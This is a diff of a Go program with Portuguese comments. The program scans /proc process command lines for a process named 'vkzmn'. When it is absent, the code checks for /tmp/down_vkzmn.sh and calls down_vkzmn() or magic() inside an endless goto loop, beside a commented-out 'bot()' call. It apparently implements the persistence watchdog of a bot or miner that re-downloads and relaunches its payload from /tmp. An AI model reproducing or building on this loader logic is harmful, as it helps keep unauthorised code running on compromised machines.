@@ -29,11 +29,6 @@ main_func:
         //go bot()
 
         
-
-
- 
-
-
 	time.Sleep(1  * time.Second)
 
 
@@ -46,7 +41,13 @@ main_func:
 
 		fmt.Println("error em open")
 
+                 return 
+
+
 	}
+
+
+
 
 	file, err := dir.Readdir(0) //ler os arquivos e direorios dentro de /proc
 
@@ -54,20 +55,31 @@ main_func:
 
 		fmt.Println("erro em dir")
 
+                 return 
+
 	}
+
+
 
 	for _, fi := range file { //intera sobre os diretorio
 
 
 		procs_cmdline := fmt.Sprintf("/proc/%s/cmdline", fi.Name()) //constroi o caminho pra pega o cmdline dos processos em execucao
 
+
 		read_procs, err := ioutil.ReadFile(procs_cmdline)
+
 
 		if err != nil {
 
 			fmt.Println("") //error em readall
 
+                         return
+
 		}
+
+
+
 
 		str_proc := string(read_procs)
 
@@ -76,23 +88,15 @@ main_func:
 		if out == true {
 
 			vkzmn_ok = 23
-
-                         
-
+                        
 
 		}
-
 
 	}
 
 
-
-
 	if vkzmn_ok == 23 {
                      
-
-
-              
  
 		fmt.Println("vkzmn em execucao")
 
@@ -101,12 +105,9 @@ main_func:
 
 	} else {
 
-
 		fmt.Println("vkzmn nao ta em execucao")
 
-
                     _, err_open :=   os.Open("/tmp/down_vkzmn.sh")  
-
 
                         if  err_open != nil { 
                      
@@ -116,14 +117,11 @@ main_func:
                             down_vkzmn()
   
 
-
                           } else {
-
 
 
                              fmt.Println("down_vkzmn.sh ja esta em //tmp" )
                                    
-
        
                              magic()
 
@@ -136,7 +134,12 @@ main_func:
 
 
 
+
 	}
+
+
+
+
 
 
 	goto main_func
